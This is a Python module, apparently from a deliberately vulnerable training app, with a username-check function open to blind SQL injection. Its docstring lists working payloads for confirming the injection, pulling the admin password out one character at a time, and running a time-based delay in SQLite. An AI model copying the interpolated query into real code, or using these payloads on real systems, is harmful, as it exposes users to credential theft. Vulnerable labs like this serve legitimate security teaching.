"""
Blind SQL Injection — CWE-89.

Unlike search_users (which echoes the query and DB error), this tool suppresses
all errors and returns only a boolean string. Error-based and UNION-based
techniques do not work here — boolean-based inference is required.
"""
import sqlite3

from data.db import get_conn


def check_username(username: str) -> str:
    """Check whether a username exists in the system. Returns 'true' or 'false'.

    VULNERABLE: blind SQL injection — errors are silently swallowed, only the
    boolean result leaks information. Use conditional payloads to infer data.

    Confirm injection point (returns 'true' instead of 'false'):
        ' OR '1'='1' --

    Boolean extraction — test if admin password starts with 'S':
        ' OR (SELECT CASE WHEN substr(password,1,1)='S' THEN 1 ELSE 0 END
              FROM users WHERE name='admin')='1' --

    Extract each character with a loop:
        ' OR (SELECT CASE WHEN substr(password,{n},1)='{c}' THEN 1 ELSE 0 END
              FROM users WHERE name='admin')='1' --

    Time-based (SQLite — delay via recursive CTE):
        ' OR (SELECT CASE WHEN substr(password,1,1)='S'
              THEN (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS
                    (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<5000000) SELECT x FROM r))
              ELSE 0 END FROM users WHERE name='admin')>0 --
    """
    db = get_conn()
    query = f"SELECT COUNT(*) FROM users WHERE name = '{username}'"
    try:
        cur = db.execute(query)
        count = cur.fetchone()[0]
        return "true" if count > 0 else "false"
    except sqlite3.Error:
        # Deliberately suppress errors — no verbose output for the attacker
        return "false"
